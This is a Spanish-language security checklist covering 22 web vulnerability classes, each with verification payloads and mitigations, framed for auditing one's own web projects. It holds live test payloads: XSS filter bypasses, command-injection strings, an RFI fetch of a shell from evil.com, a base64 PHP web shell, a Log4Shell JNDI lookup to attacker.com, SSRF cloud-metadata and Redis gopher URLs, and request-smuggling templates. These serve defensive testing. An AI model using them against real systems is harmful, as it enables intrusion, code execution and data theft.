# Catálogo de vulnerabilidades web: verificación y mitigación

> Alcance: auditoría/defensa de proyectos PROPIOS (web/API). Verificación con payloads manuales, curl, one-liners Python y navegador. Sin herramientas ofensivas de Kali (sqlmap, nuclei, ffuf, Burp, jwt_tool, hashcat, etc.).

## Índice

1. [CSRF](#1-csrf) · 2. [XSS](#2-xss-cross-site-scripting) · 3. [Code Injection](#3-code-injection-php-python-nodejs) · 4. [SSTI](#4-server-side-template-injection-ssti) · 5. [NoSQL `$where`](#5-nosql-injection-wire) · 6. [LFI/RFI](#6-lfi--rfi) · 7. [HTML Injection](#7-html-injection) · 8. [CRLF Injection](#8-crlf-injection-http-response-splitting) · 9. [Host Header Injection](#9-host-header-injection) · 10. [Email/SMTP Injection](#10-email-injection-smtp-injection) · 11. [SSI Injection](#11-ssi-injection) · 12. [Log Injection](#12-log-injection) · 13. [GraphQL](#13-graphql) · 14. [SSRF](#14-ssrf-server-side-request-forgery) · 15. [Clickjacking](#15-clickjacking-ui-redressing) · 16. [CSWSH](#16-cross-site-websocket-hijacking-cwsh) · 17. [Open Redirect](#17-open-redirect) · 18. [Tabnabbing](#18-tabnabbing--reverse-tabnabbing) · 19. [Prototype Pollution](#19-client-side-prototype-pollution) · 20. [Request Smuggling](#20-http-request-smuggling) · 21. [Cache Poisoning / Deception](#21-cache-poisoning--web-cache-deception) · 22. [DNS Rebinding](#22-dns-rebinding)

## 1. CSRF

**Qué es**: El atacante engaña a un usuario autenticado para ejecutar acciones no deseadas en una aplicación donde está logueado.

**Cómo verificarla**:
- Ausencia de token CSRF en formularios de estado (POST, PUT, DELETE).
- Token predecible (timestamp, secuencial, estático) o reusable (no single-use).
- Cookie `SameSite` ausente, en `None`, o no configurada como `Strict`/`Lax`.
- Bypass de `SameSite=Lax` con requests GET en formularios.

**Mitigación**: token CSRF único, aleatorio y asociado a la sesión (doble uso: formulario + cookie); SameSite=Strict o Lax en cookies de sesión; custom request headers para APIs; validación de `Referer`/`Origin`.

```html
<!-- Token en formulario -->
<input type="hidden" name="csrf_token" value="{{ csrf_token }}">
<!-- Header en AJAX -->
<meta name="csrf-token" content="{{ csrf_token }}">
<!-- Cookie -->
Set-Cookie: csrf_token=...; SameSite=Strict; Secure; HttpOnly
```

Ref: OWASP CSRF Prevention Cheat Sheet.

## 2. XSS (Cross-Site Scripting)

**Qué es**: Inyección de scripts en páginas vistas por otros usuarios.

**Tipos**:
- **Reflected**: parámetro en URL reflejado sin escapar → `?q=<script>alert(1)</script>`.
- **Stored**: input guardado en BD y ejecutado al cargar la página para otros usuarios.
- **DOM-based**: JS del cliente usa datos no confiables → `document.write(location.hash)`, `innerHTML`.
- **Blind XSS**: payload almacenado que se ejecuta en un sistema diferente (dashboard admin, logs).
- **mXSS (Mutation XSS)**: el parser HTML del navegador muta markup malformado creando un vector XSS.

**Cómo verificarla — payloads de prueba**:
```
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
'-alert(1)-'
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
```
Payloads adicionales: `<body onload=alert(1)>`, `<marquee onstart=alert(1)>`, `<input autofocus onfocus=alert(1)>`, `javascript:alert(document.cookie)`.

**Bypass de filtros**:
```
// Double encoding
%253Cscript%253Ealert(1)%253C/script%253E
// Unicode
\u003cscript\u003ealert(1)\u003c/script\u003e
// Sin script tag (eval + base64)
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
// Template literals / sin parentesis
<img src=x onerror=alert`1`>
<img src=x onerror=setTimeout`alert\x281\x29`>
```

**Verificación en navegador** (DevTools): listar parámetros de la URL que se reflejan en la respuesta para ubicar puntos de inyección:
```js
() => [...new URLSearchParams(window.location.search)].map(([param, value]) =>
  ({ param, value: value.substring(0, 100) }))
```

**Mitigación — output encoding contextual (OWASP)**:

| Contexto | Ejemplo | Codificación |
|----------|---------|--------------|
| HTML | `<div>VAR</div>` | HTML entity encode (`&`, `<`, `>`, `"`, `'`) |
| HTML Attribute | `<div attr="VAR">` | HTML attribute encode + quotes |
| JavaScript | `<script>var x='VAR'</script>` | Unicode `\uXXXX` encode |
| CSS | `<style>prop: VAR</style>` | CSS hex encode |
| URL | `<a href="VAR">` | URL percent encode + HTML attribute encode |

Además: Content-Security-Policy, sanitizers como DOMPurify para `<script>`/innerHTML, Trusted Types.

## 3. Code Injection (PHP, Python, Node.js)

**Qué es**: Inyección de código en el lenguaje del servidor vía funciones como `eval()`, `exec()`, `assert()`.

**Cómo verificarla**:
- PHP: `?param=phpinfo()`, `?param=system('id')`, `?param=file_get_contents('/etc/passwd')`
- Python: `?param=__import__('os').system('id')`, `?param=eval("__import__('os').popen('id').read()")`
- Node.js: `?param=require('child_process').execSync('id')`, `?param=process.env`

**Mitigación**: NO usar eval()/exec() con input de usuario; sandboxing; input validation; Content-Security-Policy.

## 4. Server-Side Template Injection (SSTI)

**Qué es**: Inyección en motores de templates (Jinja2, Twig, Freemarker, Pug, Handlebars). Puede llevar a RCE.

**Cómo verificarla**:
- `{{7*7}}` → si renderiza `49` → SSTI detectado. Variantes: `${7*7}`, `<%= 7*7 %>`, `${{7*7}}`, `#{{7*7}}`
- Jinja2/Python: `{{config}}`, `{{self.__class__.__mro__}}` (p. ej. cadenas `{{config.__class__...}}` que encadenan hacia RCE)
- Freemarker/Java: `${"freemarker.template.utility.Execute"?new()("id")}`
- Ruby ERB: `<%= system("id") %>`

**Mitigación**: NO permitir templates definidos por usuario, sandboxing de templates, desactivar funciones peligrosas. Ref: PortSwigger Research — SSTI.

## 5. NoSQL Injection `$where`

**Qué es**: Manipulación de consultas JSON/BSON en bases NoSQL (MongoDB, CouchDB).

**Cómo verificarla**: `?search=$where: "1==1"` (JavaScript injection en MongoDB). Bypass de auth: `?username=admin&password[$gt]=`, `?username[$ne]=nonexistent&password[$ne]=nonexistent`, payload POST `{"username": {"$gt": ""}, "password": {"$gt": ""}}`.

**Mitigación**: validación estricta de tipos, desactivar `$where` si no se necesita, ORM/ODM con sanitización, whitelist de input.

## 6. LFI / RFI

**Qué es**: Inclusión de archivos locales/remotos en la respuesta vía parámetros de path.

**Cómo verificarla**:
- LFI: `?page=../../../etc/passwd`, `?file=....//....//....//etc/passwd`
- LFI lectura de código fuente: `?page=php://filter/convert.base64-encode/resource=config.php`
- RFI: `?page=http://evil.com/shell.txt`
- RFI inline: `?include=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==`

**Mitigación**: whitelist de archivos permitidos, desactivar `allow_url_include`, mapas de archivos en vez de paths directos.

## 7. HTML Injection

**Qué es**: Inserción de markup HTML arbitrario (no necesariamente script). Puede llevar a phishing o defacement.

**Cómo verificarla**: `<h1>Injected</h1>`, `<img src="http://evil.com/track?cookie=">`, `<iframe src="http://evil.com">`

**Mitigación**: output encoding contextual, Content-Security-Policy.

## 8. CRLF Injection (HTTP Response Splitting)

**Qué es**: Inyección de `%0d%0a` para agregar headers o body arbitrario a la respuesta HTTP. Permite XSS, cache poisoning, defacement.

**Cómo verificarla**: `?param=test%0d%0aX-Injected:%20true` y `?param=test%0d%0a%0d%0a<script>alert(1)</script>` (comprobar con `curl -I` que aparece un header inyectado).

**Mitigación**: eliminar o codificar CR (`%0d`, `\r`, `0x0d`) y LF (`%0a`, `\n`, `0x0a`) en inputs reflejados en headers HTTP.

## 9. Host Header Injection

**Qué es**: El servidor confía en el header `Host` para lógica interna (redirecciones, links, recuperación de password, cache).

**Cómo verificarla**: `curl -H "Host: evil.com" https://target.com` y `curl -H "Host: localhost" https://target.com`. Observar password reset poisoning (el link de reset apunta a evil.com), cache poisoning, SSRF, routing-based attacks.

**Mitigación**: NO confiar en el header Host; usar `SERVER_NAME` configurado en el servidor; validar `Host` contra whitelist.

## 10. Email Injection (SMTP Injection)

**Qué es**: Inyección de cabeceras de email adicionales vía formularios de contacto (spam/phishing).

**Cómo verificarla — payloads**: `\nCc: victim@evil.com`, `\r\nBcc: attacker@evil.com`, `%0d%0aCc: attacker@evil.com`

**Mitigación**: validación estricta de input; librerías de email que prevengan header injection.

## 11. SSI Injection

**Qué es**: Inyección de directivas SSI en aplicaciones que procesan `.shtml`, `.stm`, `.shtm`.

**Cómo verificarla**: `<!--#exec cmd="ls"-->`, `<!--#include virtual="/etc/passwd"-->`, `<!--#echo var="DATE_LOCAL"-->`

**Mitigación**: deshabilitar SSI si no se usa; validar input reflejado en páginas SSI.

## 12. Log Injection

**Qué es**: Inyección de datos maliciosos en logs: envenenamiento, engaño a analistas y —en casos extremos (Log4Shell)— RCE.

**Cómo verificarla**: `${jndi:ldap://attacker.com/a}` (Log4Shell), `\n[INFO] User logged in: admin`, `\r\n[ERROR] Connection from: 0.0.0.0`

**Mitigación**: sanitizar inputs antes de loguear, no renderizar logs como HTML, logging libraries parcheadas (Log4j 2.17+).

## 13. GraphQL

**Qué es**: Consultas maliciosas a endpoints GraphQL: introspection, batching (brute force), SQLi en resolvers, field suggestion abuse.

**Cómo verificarla**:
- Introspection abuse: `{__schema{types{name,fields{name}}}}`
- Batching attack: múltiples alias en una consulta para login brute force
- SQLi en resolvers: `{ user(id: "1' OR '1'='1") { name email } }`

**Mitigación**: deshabilitar introspection en producción, rate limiting por consulta, depth limiting, query cost analysis.

## 14. SSRF (Server-Side Request Forgery)

**Qué es**: El servidor hace requests HTTP a URLs controladas por el atacante → acceso a recursos internos (metadata cloud, BD internas, servicios locales).

**Cómo verificarla — URLs internas**:
- `http://127.0.0.1:80`, `http://localhost:8080/admin`
- `http://169.254.169.254/latest/meta-data/` (AWS)
- `http://metadata.google.internal/` (GCP)
- `http://100.100.100.200/latest/meta-data/` (Alibaba Cloud)

**Bypass de filtros**:
- IPv4 alternativo: `2130706433` (decimal de 127.0.0.1), `0x7f000001`, `017700000001`, `127.1`
- URL parsing inconsistencies: `http://evil.com@internal.com`, `http://internal.com#@evil.com`
- URL redirect chains: usar redirect HTTP para llegar a una URL interna
- DNS rebinding: dominio que resuelve a IP pública y luego cambia a IP interna

**Protocolos alternativos**: `file:///etc/passwd`, `gopher://internal:6379/_*2%0d%0a...` (SSRF a Redis), `dict://internal:6379/info`

**Blind SSRF**: servidor propio que reciba callbacks DNS/HTTP para detectar la petición.

**Mitigación**: whitelist de URLs/dominios; bloquear CIDR privados (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16); deshabilitar protocolos no HTTP(S); allowlist de puertos. Ref: OWASP SSRF Prevention Cheat Sheet, PortSwigger SSRF Research.

## 15. Clickjacking (UI Redressing)

**Qué es**: El atacante incrusta la app en un iframe invisible y engaña al usuario para que haga clic sin saberlo.

**Cómo verificarla**: crear página HTML local con `<iframe src="https://target.com" style="opacity:0;position:absolute;..."></iframe>` y comprobar si la app se renderiza dentro.

**Mitigación**: `X-Frame-Options: DENY` o `SAMEORIGIN`; CSP `frame-ancestors 'none'` o `'self'`; framebreaking JS `if (top !== self) top.location.href = self.location.href;`. Ref: OWASP Clickjacking Defense Cheat Sheet.

## 16. Cross-Site WebSocket Hijacking (CSWSH)

**Qué es**: Conexión WebSocket desde un sitio malicioso a la app víctima, aprovechando que el navegador envía cookies automáticamente.

**Cómo verificarla**: comprobar si el handshake WebSocket valida el Origin header. Probar desde una página maliciosa: `new WebSocket("wss://target.com/socket")`

**Mitigación**: validar Origin header en el handshake; tokens CSRF en conexiones WebSocket.

## 17. Open Redirect

**Qué es**: El servidor redirige a URLs controladas por el atacante sin validación (phishing, bypass de filtros de URL, chain de SSRF).

**Cómo verificarla**:
```bash
curl -I "https://target.com/redirect?url=http://evil.com"
curl -I "https://target.com/redirect?url=//evil.com"
curl -I "https://target.com/redirect?next=http://evil.com"
curl "https://target.com/redirect?url=data:text/html,<script>alert(1)</script>"
```
Payloads en parámetros: `?redirect=http://evil.com`, `?url=//evil.com`, `?next=javascript:alert(1)`, `?path=\evil.com`

**Mitigación**: whitelist de URLs de destino; no redirigir basado en input de usuario; mostrar advertencia de salida.

## 18. Tabnabbing / Reverse Tabnabbing

**Qué es**: Abuso de `target="_blank"` sin `rel="noopener noreferrer"`: la página abierta puede modificar `window.opener.location` y redirigir la página original a un sitio malicioso.

**Cómo verificarla**: buscar en el HTML `<a href="..." target="_blank">` sin `rel="noopener noreferrer"`.

**Mitigación**: siempre `rel="noopener noreferrer"` en enlaces con `target="_blank"`. Ref: OWASP HTML5 Security Cheat Sheet.

## 19. Client-Side Prototype Pollution

**Qué es**: Inyección de propiedades en `Object.prototype` vía inputs del usuario (URL hash, JSON, web messages). Puede llevar a DOM XSS. Sources: `__proto__` en URL params, `JSON.parse` de datos no confiables. Sinks/Gadgets: `innerHTML`, `document.write`, `script.src`.

**Cómo verificarla**:
```
?__proto__[transport_url]=data:,alert(1);//
?__proto__[innerHTML]=<img+src=x+onerror=alert(1)>
```

**Mitigación**: sanitizar keys (`__proto__`, `constructor`, `prototype`); `Object.create(null)` para objetos sin prototype; usar `Map` en vez de objetos para almacenamiento de datos. Ref: OWASP Prototype Pollution Prevention Cheat Sheet, PortSwigger Research.

## 20. HTTP Request Smuggling

**Qué es**: Inconsistencias al interpretar límites HTTP entre frontend (proxy/balancer) y backend → envenenamiento de cache, bypass de seguridad, secuestro de requests de otros usuarios. Tipos: CL.TE (Content-Length vs Transfer-Encoding), TE.CL, TE.TE (Transfer-Encoding ofuscado).

**Cómo verificarla** (CL.TE):
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Mitigación**: deshabilitar reenvío de conexiones HTTP/1.1 (usar HTTP/2 si es posible); frontend y backend con el mismo parser HTTP. Ref: PortSwigger Request Smuggling Research.

## 21. Cache Poisoning / Web Cache Deception

**Qué es**: Engañar a un cache CDN (Cloudflare, Akamai, Varnish) para almacenar contenido dinámico sensible y servirlo a otros usuarios.

**Cómo verificarla** (Web Cache Deception): `curl -I "https://target.com/api/user/profile/test.css"` — el cache cree que es un CSS estático, pero el servidor lo trata como `/api/user/profile/` y devuelve datos sensibles.

**Mitigación**: no cachear respuestas dinámicas/sensibles; `Cache-Control` adecuados; claves de caché configuradas apropiadamente. Ref: PortSwigger Web Cache Deception Research, OWASP Cache Poisoning.

## 22. DNS Rebinding

**Qué es**: Técnica para bypassear restricciones same-origin: un dominio alterna entre resolver a IP pública y a IP privada (127.0.0.1).

**Cómo verificarla**: usar servicios como `rebind.it` para crear un dominio que alterna entre 1.2.3.4 y 127.0.0.1, y comprobar si la app acepta peticiones resueltas a localhost.

**Mitigación**: validación de Host header; validar IP de origen en el servidor; pinning de DNS; TLS con SNI validation.
